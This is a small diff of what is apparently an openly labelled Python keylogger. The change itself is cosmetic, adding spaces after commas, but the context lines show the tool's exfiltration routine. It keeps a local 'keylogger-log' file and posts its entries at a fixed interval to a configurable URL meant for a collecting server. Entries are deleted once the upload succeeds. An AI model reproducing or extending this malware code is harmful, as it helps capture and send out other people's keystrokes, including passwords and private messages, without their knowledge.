@@ -7,7 +7,7 @@ from datetime import datetime, timezone # to classify logs by time sent
 URL = 'http://127.0.0.1:8000/log' # the URL/IP to which you want to send the logs to
 INTERVAL = 10.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
 
-with open('keylogger-log','w') as l: # to create the file to avoid any errors
+with open('keylogger-log', 'w') as l: # to create the file to avoid any errors
     pass
 
 def send_log(): # send log
@@ -21,7 +21,7 @@ def send_log(): # send log
             if not 300 > r.status_code >= 200:
                 pass # Leaves the entries to go through later if the request didn't go through
             else: # assume new entries were made during process of sending and delete only entries which were already sent
-                with open('keylogger-log','r+') as l:
+                with open('keylogger-log', 'r+') as l:
                     lines = l.readlines() # get all the entries into an array
                     l.seek(0) # go to start of file
                     l.truncate() # erase the whole file before rewriting
